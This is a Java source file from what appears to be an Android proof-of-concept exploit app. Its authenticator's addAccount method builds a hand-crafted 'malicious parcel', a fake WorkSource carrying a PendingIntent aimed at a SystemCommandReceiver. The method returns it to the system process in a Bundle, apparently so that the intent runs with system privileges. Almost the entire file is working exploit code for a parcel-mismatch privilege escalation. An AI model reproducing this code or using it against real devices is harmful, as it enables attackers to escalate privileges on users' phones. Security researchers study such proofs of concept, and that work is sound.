package com.example.tzpoc;

import android.accounts.AbstractAccountAuthenticator;
import android.accounts.Account;
import android.accounts.AccountAuthenticatorResponse;
import android.accounts.NetworkErrorException;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Parcel;
import android.util.Log;

public class MyAuthenticator extends AbstractAccountAuthenticator {
    public MyAuthenticator(Context context) {
        super(context);
    }

    @Override
    public Bundle editProperties(AccountAuthenticatorResponse response, String accountType) {
        return null;
    }

    @Override
    public Bundle addAccount(AccountAuthenticatorResponse response, String accountType,
                             String authTokenType, String[] requiredFeatures, Bundle options)
            throws NetworkErrorException {

        MainActivity.appendLog("[*] addAccount called. Building malicious parcel with PendingIntent...");

        // PendingIntentを構築（SystemCommandReceiverを起動）
        Intent intent = new Intent();
        intent.setComponent(new ComponentName(
                "com.example.tzpoc",
                "com.example.tzpoc.SystemCommandReceiver"
        ));
        // システム権限でPendingIntentを実行させる
        PendingIntent pendingIntent = PendingIntent.getBroadcast(
                this.mContext,
                0,
                intent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );

        // PendingIntentをParcelに書き込む
        Parcel pendingParcel = Parcel.obtain();
        pendingIntent.writeToParcel(pendingParcel, 0);

        // データParcelの構築（WorkSourceを模倣）
        Parcel dataParcel = Parcel.obtain();
        Parcel finalParcel = Parcel.obtain();

        // WorkSource のヘッダー
        dataParcel.writeInt(3);
        dataParcel.writeInt(13);
        dataParcel.writeInt(2);
        dataParcel.writeInt(0);
        dataParcel.writeInt(0);
        dataParcel.writeInt(0);
        dataParcel.writeInt(6);
        dataParcel.writeInt(0);
        dataParcel.writeInt(0);
        dataParcel.writeInt(4);
        dataParcel.writeString("android.os.WorkSource");
        dataParcel.writeInt(-1);
        dataParcel.writeInt(-1);
        dataParcel.writeInt(-1);
        dataParcel.writeInt(1);
        dataParcel.writeInt(-1);
        dataParcel.writeInt(13);
        dataParcel.writeInt(13);
        dataParcel.writeInt(68);
        dataParcel.writeInt(11);
        dataParcel.writeInt(0);
        dataParcel.writeInt(7);
        dataParcel.writeInt(0);
        dataParcel.writeInt(0);
        dataParcel.writeInt(1);
        dataParcel.writeInt(1);
        dataParcel.writeInt(13);
        dataParcel.writeInt(22);
        dataParcel.writeInt(0);
        dataParcel.writeInt(0);
        dataParcel.writeInt(0);
        dataParcel.writeInt(0);
        dataParcel.writeInt(0);
        dataParcel.writeInt(0);
        dataParcel.writeInt(13);
        dataParcel.writeInt(-1);

        // PendingIntent データの埋め込み（キーは "intent" にしているが、実際は PendingIntent が入る）
        int intentStartPos = dataParcel.dataPosition();
        dataParcel.writeString("intent");
        dataParcel.writeInt(4);          // PARCELABLE
        dataParcel.writeString("android.app.PendingIntent");
        dataParcel.appendFrom(pendingParcel, 0, pendingParcel.dataSize());

        // 長さを修正
        int intentEndPos = dataParcel.dataPosition();
        dataParcel.setDataPosition(intentStartPos - 4);
        dataParcel.writeInt(intentEndPos - intentStartPos);
        dataParcel.setDataPosition(intentEndPos);

        // Bundle 用のラッパー
        int totalSize = dataParcel.dataSize();
        MainActivity.appendLog("[+] Malicious parcel size: 0x" + Integer.toHexString(totalSize));

        finalParcel.writeInt(totalSize);
        finalParcel.writeInt(0x4c444e42); // "BDNL"
        finalParcel.appendFrom(dataParcel, 0, totalSize);
        finalParcel.setDataPosition(0);

        // Bundle に変換
        Bundle result = new Bundle();
        try {
            result.readFromParcel(finalParcel);
            MainActivity.appendLog("[+] Malicious bundle created with PendingIntent.");
        } catch (Exception e) {
            MainActivity.appendLog("[-] Failed to read malicious parcel: " + e.getMessage());
        }

        pendingParcel.recycle();
        dataParcel.recycle();
        finalParcel.recycle();

        MainActivity.appendLog("[*] Returning malicious bundle to system process.");
        return result;
    }

    // その他のオーバーライド（空実装）
    @Override
    public Bundle confirmCredentials(AccountAuthenticatorResponse response, Account account, Bundle options) {
        return null;
    }
    @Override
    public Bundle getAuthToken(AccountAuthenticatorResponse response, Account account, String authTokenType, Bundle options) {
        return null;
    }
    @Override
    public String getAuthTokenLabel(String authTokenType) {
        return null;
    }
    @Override
    public Bundle updateCredentials(AccountAuthenticatorResponse response, Account account, String authTokenType, Bundle options) {
        return null;
    }
    @Override
    public Bundle hasFeatures(AccountAuthenticatorResponse response, Account account, String[] features) {
        return null;
    }
}
